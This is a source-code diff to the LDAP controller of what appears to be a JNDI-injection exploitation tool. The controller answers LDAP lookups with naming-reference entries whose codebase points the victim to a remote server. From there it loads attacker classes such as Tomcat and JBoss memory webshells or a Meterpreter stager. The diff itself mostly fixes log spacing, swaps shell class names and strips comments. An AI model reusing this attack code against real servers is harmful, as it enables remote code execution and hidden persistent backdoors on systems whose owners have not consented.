@@ -72,7 +72,7 @@ public class BasicController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+]|@Sending LDAP ResourceRef result for" + base + " with basic remote reference payload"));
+            System.out.println(ansi().render("@|green [+]|@ Sending LDAP ResourceRef result for" + base + " with basic remote reference payload"));
             Entry     e         = new Entry(base);
             String    className = "";
             CtClass   ctClass;
@@ -143,7 +143,7 @@ public class BasicController implements LdapController {
                     className = WSWebsphereProxy.class.getName();
                     break;
                 case tomcatfilterjmx:
-                    className = structureShell(TFJMX.class);
+                    className = structureShell(TSMSFromJMXF.class);
                     break;
                 case tomcatfilterth:
                     className = structureShell(TFMSFromThreadF.class);
@@ -152,13 +152,13 @@ public class BasicController implements LdapController {
                     className = structureShell(TLMSFromJMXLi.class);
                     break;
                 case tomcatlistenerth:
-                    className = structureShell(TLMSFromThreadLi.class);
+                    className = structureShell(TFMSFromThreadLi.class);
                     break;
                 case tomcatservletjmx:
                     className = structureShell(TSMSFromJMXS.class);
                     break;
                 case tomcatservletth:
-                    className = structureShell(TSMSFromThreadS.class);
+                    className = structureShell(TFMSFromThreadS.class);
                     break;
                 case jbossfilter:
                     className = structureShell(JBFMSFromContextF.class);
@@ -332,19 +332,15 @@ public class BasicController implements LdapController {
                     break;
             }
 
-            // 从给定的代码库路径和类名创建URL
             URL turl = new URL(new URL(this.codebase), className + ".class");
             System.out.println(ansi().render("@|green [+]|@ Send LDAP reference result for " + base + " redirecting to" + turl));
-            // 创建一个新的条目并添加属性
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaCodeBase", this.codebase);
             e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            // 如果className是Meterpreter，则添加javaFactory属性为“Meterpreter”，否则为className
             if (className.equals("com.feihong.ldap.template.Meterpreter")) {
                 e.addAttribute("javaFactory", "Meterpreter");
             }
             e.addAttribute("javaFactory", className);
-            // 发送搜索条目并设置结果代码为成功
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
@@ -372,7 +368,7 @@ public class BasicController implements LdapController {
             try {
                 // 将类型值设为从第一个斜杠后的字符串到第二个斜杠前（不包括第二个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                 payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
-                System.out.println(ansi().render("@|green [+]|@PaylaodType >> " + payloadType));
+                System.out.println(ansi().render("@|green [+]|@ PaylaodType >> " + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
